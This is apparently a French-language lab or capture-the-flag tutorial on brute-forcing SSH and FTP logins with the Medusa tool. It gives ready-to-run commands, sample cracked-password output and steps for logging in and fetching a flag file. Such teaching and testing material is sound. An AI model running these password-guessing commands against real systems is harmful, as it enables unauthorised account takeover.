# Web Services : Medusa

## <mark style="color:red;">**Introduction**</mark>

Dans le domaine de la cybersécurité, les mécanismes d'authentification robustes sont essentiels pour protéger les services critiques tels que :

* **SSH** : Protocole réseau cryptographique pour un accès sécurisé à distance.
* **FTP** : Protocole de transfert de fichiers vulnérable lorsqu'il utilise des identifiants faibles ou transmis en clair.

Medusa est un outil de brute-forcing rapide et modulaire permettant d’identifier des vulnérabilités d'authentification sur ces services.

***

## <mark style="color:red;">**Utilisation de Medusa pour Brute-Force**</mark>

Medusa permet de tester systématiquement des combinaisons utilisateur/mot de passe. Exemple général de commande :

```bash
medusa -h <IP> -n <PORT> -u <USERNAME> -P <WORDLIST> -M <MODULE> -t <THREADS>
```

**Options Principales :**

<table data-full-width="true"><thead><tr><th>Option</th><th>Description</th><th>Exemple</th></tr></thead><tbody><tr><td><code>-h &#x3C;IP></code></td><td>Spécifie l'adresse IP cible.</td><td><code>-h 192.168.0.10</code></td></tr><tr><td><code>-n &#x3C;PORT></code></td><td>Spécifie le port du service (par défaut SSH = 22, FTP = 21).</td><td><code>-n 22</code></td></tr><tr><td><code>-u &#x3C;USERNAME></code></td><td>Définit un utilisateur unique.</td><td><code>-u sshuser</code></td></tr><tr><td><code>-P &#x3C;WORDLIST></code></td><td>Spécifie une liste de mots de passe à tester.</td><td><code>-P passwords.txt</code></td></tr><tr><td><code>-M &#x3C;MODULE></code></td><td>Sélectionne le module du service cible (SSH, FTP, etc.).</td><td><code>-M ssh</code></td></tr><tr><td><code>-t &#x3C;THREADS></code></td><td>Définit le nombre de tentatives parallèles.</td><td><code>-t 5</code></td></tr></tbody></table>

***

### <mark style="color:blue;">**Exemple : Attaque SSH**</mark>

<mark style="color:green;">**Commande**</mark>**&#x20;:**

{% code fullWidth="true" %}
```bash
medusa -h 192.168.0.100 -n 22 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
{% endcode %}

<mark style="color:green;">**Résultat attendu :**</mark>

Medusa teste chaque mot de passe de la liste jusqu'à trouver le bon :

{% code fullWidth="true" %}
```plaintext
ACCOUNT FOUND: [ssh] Host: 192.168.0.100 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```
{% endcode %}

<mark style="color:green;">**Accès au système :**</mark>

Connectez-vous via SSH :

```bash
ssh sshuser@192.168.0.100 -p 22
```

***

### <mark style="color:blue;">**Exemple : Attaque FTP**</mark>

<mark style="color:green;">**Commande :**</mark>

{% code fullWidth="true" %}
```bash
medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5
```
{% endcode %}

<mark style="color:green;">**Résultat attendu :**</mark>

{% code fullWidth="true" %}
```plaintext
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: ftp_pass123 [SUCCESS]
```
{% endcode %}

<mark style="color:green;">**Connexion FTP et récupération de fichiers :**</mark>

1.  **Connexion FTP** :

    ```bash
    ftp ftp://ftpuser:<PASSWORD>@localhost
    ```
2.  **Récupération du fichier** :

    ```bash
    get flag.txt
    ```
3.  **Lecture du fichier** :

    ```bash
    cat flag.txt
    ```

***

#### <mark style="color:green;">**Exploration des Services**</mark>

1.  **Vérifier les ports ouverts** avec `netstat` ou `nmap` :

    ```bash
    netstat -tulpn | grep LISTEN
    nmap localhost
    ```
2. Identifier d'autres services comme FTP ou HTTP pouvant être vulnérables.

***

```bash
medusa -h <IP> -n <PORT> -u <USERNAME> -P <WORDLIST> -M <MODULE> -t <THREADS>
ssh <USERNAME>@<IP> -p <PORT>
ftp ftp://<USERNAME>:<PASSWORD>@<IP>
```

👉 **But : Identifier les vulnérabilités pour mieux les corriger.**
